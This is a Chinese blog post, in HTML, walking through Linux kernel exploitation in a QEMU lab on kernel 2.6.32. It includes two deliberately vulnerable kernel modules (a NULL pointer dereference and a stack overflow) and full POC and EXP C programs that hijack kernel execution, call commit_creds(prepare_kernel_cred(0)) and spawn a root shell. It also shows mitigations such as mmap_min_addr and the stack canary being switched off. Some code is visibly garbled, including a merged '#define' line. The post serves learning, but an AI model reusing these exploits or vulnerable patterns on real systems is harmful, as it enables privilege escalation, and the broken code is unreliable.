@@ -1,0 +1,1335 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="linux内核漏洞," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="lalala's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="kernel exploitNULL Dereference漏洞代码#include &amp;lt;linux/init.h&amp;gt; #include &amp;lt;linux/module.h&amp;gt; #include &amp;lt;linux/kernel.h&amp;gt; #include &amp;lt;linux/proc_fs.h&amp;gt;  void (*my_funptr)(void);  int bug1_wri">
+<meta name="keywords" content="linux内核漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux内核漏洞利用">
+<meta property="og:url" content="http://yoururl.com/2018/10/16/Linux内核漏洞利用/index.html">
+<meta property="og:site_name" content="lalala&#39;s blog">
+<meta property="og:description" content="kernel exploitNULL Dereference漏洞代码#include &amp;lt;linux/init.h&amp;gt; #include &amp;lt;linux/module.h&amp;gt; #include &amp;lt;linux/kernel.h&amp;gt; #include &amp;lt;linux/proc_fs.h&amp;gt;  void (*my_funptr)(void);  int bug1_wri">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoururl.com/images/pasted-256.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-257.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-258.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-259.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-260.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-261.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-262.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-263.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-264.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-265.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-266.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-267.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-268.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-269.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-270.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-271.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-272.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-273.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-274.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-275.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-276.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-277.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-278.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-279.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-280.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-281.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-282.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-283.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-284.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-285.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-286.png">
+<meta property="og:image" content="http://yoururl.com/images/pasted-287.png">
+<meta property="og:updated_time" content="2018-10-16T11:59:11.374Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux内核漏洞利用">
+<meta name="twitter:description" content="kernel exploitNULL Dereference漏洞代码#include &amp;lt;linux/init.h&amp;gt; #include &amp;lt;linux/module.h&amp;gt; #include &amp;lt;linux/kernel.h&amp;gt; #include &amp;lt;linux/proc_fs.h&amp;gt;  void (*my_funptr)(void);  int bug1_wri">
+<meta name="twitter:image" content="http://yoururl.com/images/pasted-256.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoururl.com/2018/10/16/Linux内核漏洞利用/"/>
+
+
+
+
+
+  <title>Linux内核漏洞利用 | lalala's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lalala's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">努力做一名白帽子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoururl.com/2018/10/16/Linux内核漏洞利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lalala">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/lalala">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lalala's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux内核漏洞利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-16T18:33:00+08:00">
+                2018-10-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="kernel-exploitNULL-Dereference"><a href="#kernel-exploitNULL-Dereference" class="headerlink" title="kernel exploitNULL Dereference"></a>kernel exploitNULL Dereference</h1><h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/proc_fs.h&gt;
+
+void (*my_funptr)(void);
+
+int bug1_write(struct file *file,const char *buf,unsigned long len)
+{
+        my_funptr();
+        return len;
+}
+
+static int __init null_dereference_init(void)
+{
+        printk(KERN_ALERT &quot;null_dereference driver init!\n&quot;);
+        create_proc_entry(&quot;bug1&quot;,0666,0)-&gt;write_proc = bug1_write;
+        return 0;
+}
+
+static void __exit null_dereference_exit(void)
+{
+        printk(KERN_ALERT &quot;null_dereference driver exit\n&quot;);
+}
+
+module_init(null_dereference_init);
+module_exit(null_dereference_exit);
+</code></pre><h2 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := null_dereference.o  
+KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/  
+PWD := $(shell pwd)  
+modules:  
+        $(MAKE) -C $(KERNELDR) M=$(PWD) modules  
+moduels_install:  
+        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  
+clean:  
+        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
+</code></pre><p><strong> 代码中my_funptr函数指针指向不定，可以劫持之后执行代码，原理如下图所示。</strong><br><img src="\images\pasted-256.png" alt="upload successful"><br><img src="\images\pasted-257.png" alt="upload successful"><br><img src="\images\pasted-258.png" alt="upload successful"><br><img src="\images\pasted-259.png" alt="upload successful"><br><img src="\images\pasted-260.png" alt="upload successful"><br><strong> 把驱动编译好，然后把*.ko文件丢进busybox那个文件系统中去，方便后面挂载使用。 </strong></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+
+char payload[] = &quot;\xe9\xea\xbe\xad\x0b&quot;;//jmp 0xbadbeef
+
+int main(){
+    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
+    memcpy(0, payload, sizeof(payload));
+    int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);
+    write(fd, &quot;muhe&quot;, 4);
+    return 0;
+}
+</code></pre><p><strong>gcc -static poc.c -o poc</strong> 编译好之后把程序复制到busybox-1.19.4/_install/usr<br><strong>find . | cpio -o –format=newc &gt; ../rootfs2.img</strong> 生成新的rootfs<br><strong>qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd ../../busybox-1.19.4/rootfs.img -append “root=/dev/ram rdinit=/sbin/init”</strong> 启动系统。<br>启动的时候按下<strong>ctrl+alt+2</strong>，然后gdb去连接。<br><img src="\images\pasted-261.png" alt="upload successful"><br><img src="\images\pasted-262.png" alt="upload successful"><br>qemu中ctrl+alt+1切换回去，然后进入usr目录，挂载驱动后运行poc程序。<br><img src="\images\pasted-263.png" alt="upload successful"><br>gdb里反汇编查看当前执行的指令。    pdisass $pc<br><img src="\images\pasted-264.png" alt="upload successful"><br><img src="\images\pasted-265.png" alt="upload successful"><br>exploit的思路是利用commit_creds(prepare_kernel_cred(0));<br>给当前进程赋予root权限，kernel里面是不能直接执行system(“/bin/sh”);的。<br>先取得commit_creds和prepare_kernel_cred地址。</p>
+<ul>
+<li>grep commit_creds /proc/kallsyms </li>
+<li>grep prepare_kernel_cred /proc/kallsyms<br><img src="\images\pasted-266.png" alt="upload successful"><br><img src="\images\pasted-267.png" alt="upload successful"><br>编写shellcode。<br><img src="\images\pasted-268.png" alt="upload successful"><br>得到shellcode。<br><img src="\images\pasted-269.png" alt="upload successful"><br>我们需要分配0地址空间然后放入shellcode，jmp过去执行shellcode，使当前进程有root权限，然后执行system(“/bin/sh”);，在程序返回用户态之后拿到一个root的shell。<br><img src="\images\pasted-270.png" alt="upload successful"></li>
+</ul>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+char payload[] = &quot;\x31\xc0\xe8\xb9\x7f\x06\xc1\xe8\x14\x7e\x06\xc1\xc3&quot;;
+int main()
+{
+        mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
+        memcpy(0, payload, sizeof(payload));
+        int fd = open(&quot;/proc/bug1&quot;, O_WRONLY);
+        write(fd, &quot;muhe&quot;, 4);
+        system(&quot;/bin/sh&quot;);//get root shell
+        return 0;
+}
+</code></pre><p>新建用户去测试EXP。<br><img src="\images\pasted-271.png" alt="upload successful"><br>但是得到报错。<br><img src="\images\pasted-272.png" alt="upload successful"><br>这是因为2.6.32内核已经设置mmap_min_addr为4096作为缓解措施<br>需要重新设置下mmap_min_addr：sysctl -w vm.mmap_min_addr=”0”<br>重新运行EXP。<br><img src="\images\pasted-273.png" alt="upload successful"><br>成功拿到root shell。</p>
+<h1 id="Kernel-Stack-Overflow"><a href="#Kernel-Stack-Overflow" class="headerlink" title="Kernel Stack Overflow"></a>Kernel Stack Overflow</h1><h2 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><pre><code>#include &lt;linux/init.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/proc_fs.h&gt;
+int bug2_write(struct file *file,const char *buf,unsigned long len)
+{
+    char localbuf[8];
+    memcpy(localbuf,buf,len);
+    return len;
+}
+static int __init stack_smashing_init(void)
+{
+    printk(KERN_ALERT &quot;stack_smashing driver init!\n&quot;);
+    create_proc_entry(&quot;bug2&quot;,0666,0)-&gt;write_proc = bug2_write;
+    return 0;
+}
+static void __exit stack_smashing_exit(void)
+{
+    printk(KERN_ALERT &quot;stack_smashing driver exit!\n&quot;);
+}
+module_init(stack_smashing_init);
+module_exit(stack_smashing_exit);
+</code></pre><h2 id="Makefile-1"><a href="#Makefile-1" class="headerlink" title="Makefile"></a>Makefile</h2><pre><code>obj-m := stack_smashing.o  
+KERNELDR := ~/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/
+PWD := $(shell pwd)  
+modules:  
+        $(MAKE) -C $(KERNELDR) M=$(PWD) modules  
+moduels_install:  
+        $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install  
+clean:  
+        rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions
+</code></pre><p>和用户态的栈溢出原理一样，拷贝、拼接字符串的时候未作长度检查，导致覆盖栈上保存的返回地址，只后可以劫持程序流程，从而实现代码执行的效果。只不过这是在内核空间，可以直接用来提权。</p>
+<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+int main(){
+    char buf[24] = {0};
+    memset(buf,&quot;A&quot;,24);
+    *((void**)(buf + 20)) = 0x42424242;
+    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);
+    write(fd,buf,sizeof(buf));
+}
+</code></pre><p>可以看到payload结构很简单，直接就是buffer+eip。按照前面的步骤编译POC，然后构建文件系统，qemu起内核后，运行POC。<br><img src="\images\pasted-274.png" alt="upload successful"><br>我们编译的kernel默认开启canary的，如果直接这么去运行POC，会直接kernel panic，无法利用，所以需要关闭canary选项，重新编译一个内核。编辑.config文件，注释掉CONFIG_CC_STACKPROTECTOR这一行，然后重新编译内核。<br><img src="\images\pasted-275.png" alt="upload successful"><br>再起内核跑我们的POC，发现eip被覆盖成了0x42424242。<br><img src="\images\pasted-276.png" alt="upload successful"><br>模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。<br>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。由于stack_smashing模块没有bss和data节区所以只需要指定text即可。<br>qemu中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。<br><img src="\images\pasted-277.png" alt="upload successful"><br><img src="\images\pasted-278.png" alt="upload successful"><br>运行POC之后发现eip被覆盖成了预期的值。</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><p>拿到shell的思路还是利用commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，返回到用户模式执行iret指令。当使用iret指令返回到相同保护级别的任务时，iret会从堆栈弹出代码段选择子及指令指针分别到CS与IP寄存器，并弹出标志寄存器内容到EFLAGS寄存器。当使用iret指令返回到一个不同的保护级别时，iret不仅会从堆栈弹出以上内容，还会弹出堆栈段选择子及堆栈指针分别到SS与SP寄存器。栈上保存了trap frame，返回到用户模式的时候恢复信息从以下结构读取。</p>
+<pre><code>struct trap_frame
+{
+    void* eip;                // instruction pointer +0
+    uint32_t cs;            // code segment    +4
+    uint32_t eflags;        // CPU flags       +8
+    void* esp;                // stack pointer       +12
+    uint32_t ss;            // stack segment   +16
+} __attribute__((packed));
+</code></pre><p>那么get root shell的思路就是先去执行commit_creds(prepare_kernel_cred(0))，然后返回到用户模式，执行起shell，也就是说先把当前进程权限提到root，然后执行起shell操作，那么我们就可以得到一个root的shell了。</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+struct trap_frame{
+    void *eip;
+    uint32_t cs;
+    uint32_t eflags;
+    void *esp;
+    uint32_t ss;
+}__attribute__((packed));
+struct trap_frame tf;
+void get_shell(void){
+    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);
+}
+void init_tf_work(void){
+    asm(&quot;pushl %cs;popl tf+4;&quot; //set cs
+        &quot;pushfl;popl tf+8;&quot;  //set eflags
+        &quot;pushl %esp;popl tf+12;&quot;
+        &quot;pushl %ss;popl tf+16;&quot;);
+    tf.eip = &amp;get_shell;
+    tf.esp -= 1024;
+}
+#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067b20;
+void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067980;
+void payload(void){
+    //payload here    
+    commit_creds(prepare_kernel_cred(0));
+    asm(&quot;mov $tf,%esp;&quot;
+       &quot;iret;&quot;);
+}
+int main(void){
+    char buf[24];
+    memset(buf,0x41,24);
+    *((void**)(buf+20)) = &amp;payload; //set eip to payload
+    init_tf_work();
+    write(1,buf,sizeof(buf));
+    int fd = open(&quot;/proc/bug2&quot;,O_WRONLY);
+    //exploit
+    write(fd,buf,sizeof(buf));
+    return 0;
+}
+</code></pre><p>调试EXP先要确定模块代码节地址。<br><img src="\images\pasted-279.png" alt="upload successful"><br>gdb中如图设置。<br><img src="\images\pasted-280.png" alt="upload successful"><br>然后就可以返回到系统中，运行EXP程序了。对ret指令下断，然后c过去，这时候单步的话，应该就ret到我们payload的地址了。<br><img src="\images\pasted-281.png" alt="upload successful"><br>查看一下栈顶的情况。<br><img src="\images\pasted-282.png" alt="upload successful"><br>接下来单步进入我们的payload。<br><img src="\images\pasted-283.png" alt="upload successful"><br>这里可以看到先去执行commit_creds(prepare_kernel_cred(0))了。<br><img src="\images\pasted-284.png" alt="upload successful"><br>我们主要关注iret。<br><img src="\images\pasted-285.png" alt="upload successful"><br>红色部分就是我们伪造的tf结构。<br><img src="\images\pasted-286.png" alt="upload successful"><br>这边可以看到eip指向是我们用来起shell的函数，这样看来整个payload结构是没什么问题的。<br><img src="\images\pasted-287.png" alt="upload successful"><br>成功拿到root shell。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux内核漏洞/" rel="tag"># linux内核漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/05/西门子PLC指令表/" rel="next" title="西门子PLC指令表">
+                <i class="fa fa-chevron-left"></i> 西门子PLC指令表
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+         <div id="uyan_frame"></div>
+
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/lalala"
+                alt="lalala" />
+            
+              <p class="site-author-name" itemprop="name">lalala</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/zhangdebiao" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:843345000@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel-exploitNULL-Dereference"><span class="nav-number">1.</span> <span class="nav-text">kernel exploitNULL Dereference</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Makefile"><span class="nav-number">1.2.</span> <span class="nav-text">Makefile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">1.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP"><span class="nav-number">1.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Stack-Overflow"><span class="nav-number">2.</span> <span class="nav-text">Kernel Stack Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞代码-1"><span class="nav-number">2.1.</span> <span class="nav-text">漏洞代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Makefile-1"><span class="nav-number">2.2.</span> <span class="nav-text">Makefile</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-1"><span class="nav-number">2.3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP-1"><span class="nav-number">2.4.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lalala</span>
+
+  
+</div>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_pv">
+		本站总访问量<span id="busuanzi_value_site_pv"></span>次
+	</span>
+</div>
+|
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共20.7k字</span>
+</div>
+
+<br>
+	
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
